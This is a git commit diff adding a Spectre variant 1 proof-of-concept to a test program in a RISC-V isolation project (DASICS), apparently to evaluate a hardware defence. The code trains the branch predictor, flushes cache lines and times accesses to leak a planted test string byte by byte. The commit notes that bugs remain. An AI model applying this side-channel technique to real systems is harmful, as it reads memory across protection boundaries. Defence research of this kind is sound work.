c445719a2758f2c88a0113ff8a401029d85200f9
Yang Chengyuan <yangchengyuan21s@ict.ac.cn>
2024-01-12 10:58:44 +0800

    Implement spectre-v1 and defense
    Spectre code is taken from github.com/riscv-boom/boom-attacks.
    To defend, change the bound in test_payload/test/dasics/test_dasics.c,
    func spectre_attack(), line 148.
    Bugs remain.

--- test_payload/test/dasics/test_dasics.c
+++ test_payload/test/dasics/test_dasics.c
@@ -2,6 +2,7 @@
 #include "stdcsr.h"
 #include <stddasics.h>
 #include "sys/syscall.h"
+#include "cache.h"
 
 static char ATTR_ULIB_DATA secret[128] = "[ULIB1]: It's the secret!\n";
 static char ATTR_ULIB_DATA pub_readonly[128] = "[ULIB1]: Enter dasics_ulib1 ...\n";
@@ -11,6 +12,22 @@ static char ATTR_ULIB_DATA main_prompt1[128] = "[UMAIN]: Ready to enter dasics_u
 static char ATTR_ULIB_DATA main_prompt2[128] = "[UMAIN]: DasicsLibCfg0: 0x%lx\n";
 static char ATTR_ULIB_DATA main_prompt3[128] = "[UMAIN]: DasicsReturnPC: 0x%lx\n";
 static char ATTR_ULIB_DATA main_prompt4[128] = "[UMAIN]: DasicsFreeZoneReturnPC: 0x%lx\n";
+
+#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
+#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
+#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
+#define SECRET_SZ 26
+#define CACHE_HIT_THRESHOLD 40
+
+uint64_t ATTR_ULIB_DATA array1_sz = 16;
+uint8_t ATTR_ULIB_DATA unused1[64];
+uint8_t ATTR_ULIB_DATA array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t ATTR_ULIB_DATA unused2[64];
+uint8_t ATTR_ULIB_DATA array2[256 * L1_BLOCK_SZ_BYTES];
+char ATTR_ULIB_DATA secretString[32] = "!\"#ThisIsTheBabyBoomerTest";
+
+char ATTR_ULIB_DATA spectre_format1[64] = "m[0x%x] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c)";
+char ATTR_ULIB_DATA spectre_format2[64] = " 2.(%lu, %d, %c)\n";
 
 void ATTR_UMAIN_TEXT dasics_main(void);
 
@@ -58,8 +75,140 @@ static void ATTR_ULIB_TEXT dasics_ulib1(void) {
 
 }
 
+/**
+ * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
+ * the bounds of the array through the Spectre Variant 1 attack.
+ *
+ * @input idx input to be used to idx the array
+ */
+void ATTR_ULIB_TEXT victimFunc(uint64_t idx){
+    uint8_t dummy = 2;
+
+    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
+    array1_sz =  array1_sz << 4;
+    asm("fcvt.s.lu	fa4, %[in]\n"
+        "fcvt.s.lu	fa5, %[inout]\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fcvt.lu.s	%[out], fa5, rtz\n"
+        : [out] "=r" (array1_sz)
+        : [inout] "r" (array1_sz), [in] "r" (dummy)
+        : "fa4", "fa5");
+
+    if (idx < array1_sz){
+        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
+    }
+
+    // bound speculation here just in case it goes over
+    dummy = read_csr(cycle);
+}
+
+/**
+ * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
+ * corresponding values) in the inArray array that has the highest values.
+ *
+ * @input inArray array of values to find the top two maxs
+ * @input inArraySize size of the inArray array in entries
+ * @inout outIdxArray array holding the idxs of the top two values
+ *        ([0] idx has the larger value in inArray array)
+ * @inout outValArray array holding the top two values ([0] has the larger value)
+ */
+void ATTR_UMAIN_TEXT topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
+    outValArray[0] = 0;
+    outValArray[1] = 0;
+
+    for (uint64_t i = 0; i < inArraySize; ++i){
+        if (inArray[i] > outValArray[0]){
+            outValArray[1] = outValArray[0];
+            outValArray[0] = inArray[i];
+            outIdxArray[1] = outIdxArray[0];
+            outIdxArray[0] = i;
+        }
+        else if (inArray[i] > outValArray[1]){
+            outValArray[1] = inArray[i];
+            outIdxArray[1] = i;
+        }
+    }
+}
+
 extern int main_printf(const char *fmt, void* func_name);
 extern void main_call_lib(void* func_name);
+extern void main_call_lib1(uint64_t arg, void* func_name);
+extern void main_call_lib6(const char *fmt, uint64_t arg0, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, void* func_name);
+extern void main_call_lib4(const char *fmt, uint64_t arg0, uint64_t arg1, uint64_t arg2, void* func_name);
+
+void ATTR_UMAIN_TEXT spectre_attack(void) {
+    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
+    uint64_t start, diff, passInIdx, randIdx;
+    uint8_t dummy = 0;
+    static uint64_t results[256];
+    int idx0, idx1, idx2, idx3;
+    idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R | DASICS_LIBCFG_W, (uint64_t)(&array1_sz), (uint64_t)(secretString + 32));
+    idx1 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)spectre_format1, (uint64_t)(spectre_format2 + 64));
+    extern char __ULIB_TEXT_BEGIN__, __ULIB_TEXT_END__;
+    idx2 = dasics_jumpcfg_alloc((uint64_t)&__ULIB_TEXT_BEGIN__, (uint64_t)&__ULIB_TEXT_END__);
+
+    // try to read out the secret
+    for(uint64_t len = 0; len < SECRET_SZ; ++len){
+
+        // clear results every round
+        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
+            results[cIdx] = 0;
+        }
+
+        // run the attack on the same idx ATTACK_SAME_ROUNDS times
+        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
+
+            // make sure array you read from is not in the cache
+            flushCache((uint64_t)array2, sizeof(array2));
+
+            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
+                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
+                // avoid jumps in case those tip off the branch predictor
+                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
+                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
+                randIdx = atkRound % array1_sz;
+                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
+                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
+                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx
+
+                // set of constant takens to make the BHR be in a all taken state
+                for(uint64_t k = 0; k < 30; ++k){
+                    asm("");
+                }
+
+                // call function to train or attack
+                main_call_lib1(passInIdx, &victimFunc);
+            }
+
+            // read out array 2 and see the hit secret value
+            // this is also assuming there is no prefetching
+            for (uint64_t i = 0; i < 256; ++i){
+                start = read_csr(cycle);
+                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
+                diff = (read_csr(cycle) - start);
+                if ( diff < CACHE_HIT_THRESHOLD ){
+                    results[i] += 1;
+                }
+            }
+        }
+
+        // get highest and second highest result hit values
+        uint8_t output[2];
+        uint64_t hitArray[2];
+        topTwoIdx(results, 256, output, hitArray);
+
+        main_call_lib6(spectre_format1, (uint64_t)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], &printf);
+        main_call_lib4(spectre_format2, hitArray[1], output[1], output[1], &printf);
+
+        // read in the next secret
+        ++attackIdx;
+    }
+
+    return;
+}
 
 void ATTR_UMAIN_TEXT dasics_main(void) {
     // Handlers of DasicsLibCfgs
@@ -75,6 +224,9 @@ void ATTR_UMAIN_TEXT dasics_main(void) {
     idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R, (uint64_t)main_prompt1, (uint64_t)(main_prompt1 + 128));
     main_printf(main_prompt1, &printf);
     dasics_libcfg_free(idx0);
+
+    spectre_attack();
+    sys_exit();
 
     // Allocate libcfg before calling lib function
     idx0 = dasics_libcfg_alloc(DASICS_LIBCFG_V | DASICS_LIBCFG_R                  , (uint64_t)pub_readonly, (uint64_t)(pub_readonly + 128));
